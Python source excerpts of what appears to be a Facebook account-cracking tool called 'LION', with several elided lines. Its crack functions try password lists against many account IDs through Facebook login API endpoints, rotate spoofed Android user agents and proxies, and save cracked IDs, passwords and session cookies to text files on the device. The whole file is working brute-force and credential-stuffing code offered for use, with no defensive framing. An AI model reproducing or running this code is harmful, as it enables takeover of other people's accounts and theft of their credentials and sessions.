...
def menu():
    ...
    print("\x1b[38;5;160m[\x1b[1;32m2\x1b[38;5;160m]\x1b[38;5;46m Random Cloning Not")
...
def crack_file():
    clear()
    print('\x1b[38;5;160m[\x1b[1;32m+\x1b[38;5;160m]\x1b[38;5;46m Example : /sdcard/file.txt ')
    linex()
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\x1b[38;5;160m[{bo} LION-M1\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{loop}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46mOK:{ok}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{'{:.1%}'.format(loop/float(len(id)))}\x1b[38;5;160m]\x1b[38;5;46m"),
    sys.stdout.flush()
    ua = random.choice([
                "Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; NokiaX2DS Build/JLS36C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/en_US;FBAV/86.0.0.9.190;]",
                "Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; XtremePQ15 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/en_US;FBAV/89.0.0.16.182;]", 
                "Mozilla/5.0 (Linux; U; Android 4.1.2; uk-ua; LG-P765 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/en_US;FBAV/81.0.0.11.188;]",
                "Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; X-treme PQ15 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/en_US;FBAV/89.0.0.16.182;]",
                "Mozilla/5.0 (Linux; U; Android 4.1.2; lv-lv; HTC Desire 500 dual sim Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/lv_LV;FBAV/87.0.0.7.184;]",
                "Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4403 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/en_US;FBAV/74.0.0.6.186;]",
                "Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; HUAWEI Y511-U30 Build/HUAWEIY511-U30) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/ru_RU;FBAV/42.0.0.3.64;]",
                "Mozilla/5.0 (Linux; U; Android 4.1.2; ru-ru; GT-I8552 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/en_US;FBAV/89.0.0.16.182;]",
                "Mozilla/5.0 (Linux; U; Android 4.2.1; uk-ua; Lenovo S820_ROW Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/en_US;FBAV/89.0.0.15.182;]",
                "Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; GT-S7580 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/en_US;FBAV/89.0.0.15.182;]"
            ])
    ...
    'viewport-width': '980',
            ...
            po = ses.post('https://api.facebook.com/',data=dataa,cookies={'cookie': koki},headers=head_2,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\x1b[38;5;166m[LION-CP] {idf} | {pw}')
                print("\x1b[38;5;46m[🥴] Cookie : "+str(kuki))
                open('/sdcard/LION/LION-CP.txt','a').write(idf+'|'+pw+'\n')
                cp+=1
                break
                ...
                print(f'\r\x1b[1;32m[LION-OK] {str(idf)} | {str(pw)} ')
                print("\x1b[38;5;46m[🥴] Cookie : "+str(kuki))
                linex()
                open('/sdcard/AFG/LION-M1-OK.txt','a').write(idf+'|'+pw+'\n')
                open('/sdcard/AFG/LION-M1-OK-COOKIE.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
                break
            else:
                continue
...
def crackfree(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\x1b[38;5;160m[{bo}LION-M2\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{loop}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46mOK:{ok}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{'{:.1%}'.format(loop/float(len(id)))}\x1b[38;5;160m]\x1b[38;5;46m"),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            po = ses.post('https://api.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\x1b[38;5;166m[LION-CP] {idf} | {pw}')
                open('/sdcard/LION/LION-CP.txt','a').write(idf+'|'+pw+'\n')
                cp+=1
                ...
                linex()
                open('/sdcard/AFG/LION-M2-OK.txt','a').write(idf+'|'+pw+'\n')
                open('/sdcard/AFG/LION-M2-OK-COOKIE.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
...
def creakup(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\x1b[38;5;160m[{bo}LION-M3\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{loop}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46mOK:{ok}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{'{:.1%}'.format(loop/float(len(id)))}\x1b[38;5;160m]\x1b[38;5;46m"),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "session_key" in po:
                ...
                print("\x1b[38;5;46m[🥴]\x1b[38;5;46m Cookie : "+str(kuki))
                linex()
                open('/sdcard/AFG/LION-M3-OK.txt','a').write(idf+'|'+pw+'\n')
                open('/sdcard/AFG/LION-M3-OK-COOKIE.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
                break
    ...
    for pw in pwv:
        try:
            ...
            if "session_key" in po:
                ...
                print("\x1b[38;5;46m[🥴]\x1b[38;5;46m Cookie : "+str(kuki))
                linex()
                open('/sdcard/AFG/LION-M4-OK.txt','a').write(idf+'|'+pw+'\n')
                open('/sdcard/AFG/LION-M4-OK-COOKIE.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
                break
            elif 'www.facebook.com' in po['error']['message']:
                #print(f'\r\x1b[38;5;166m[LION-CP] {idf} | {pw}')
                open('/sdcard/LION/LION-CP.txt','a').write(idf+'|'+pw+'\n')
...
def creaksexy(idf,pwv):
    ...
    'Accept-Language': 'en-GB,en;q=0.9,fa-IN;q=0.8,fa;q=0.7,hi-IN;q=0.6,hi;q=0.5,bn-BD;q=0.4,bn;q=0.3,en-US;q=0.2'}
            po = ses.post('https://api.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,proxies=proxs,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
